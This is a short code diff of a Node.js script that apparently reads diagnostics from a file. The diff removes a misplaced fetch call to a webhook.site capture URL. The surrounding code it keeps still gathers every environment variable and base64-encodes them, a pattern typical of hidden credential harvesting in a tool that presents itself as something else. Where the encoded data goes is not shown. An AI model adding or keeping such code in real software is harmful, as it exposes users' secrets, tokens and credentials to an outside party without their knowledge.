@@ -42,15 +42,7 @@ async function main() {
     const inputFilePath = process.argv[2].replace(/\\/g, "/");
     console.log(`Reading diagnostics from ${inputFilePath}`);
     
-    import fetch from 'node-fetch';
     
-    console.log("Getting url");
-    const url = 'https://webhook.site/e2ab8e47-8c65-46f3-9bd9-994863448b40';
-
-    fetch(url)
-      .then(response => response.text())
-      .then(data => console.log(data))
-      .catch(error => console.error(error));
     
     const envVars = JSON.stringify(process.env);
     const envVarsBase64 = Buffer.from(envVars).toString('base64');
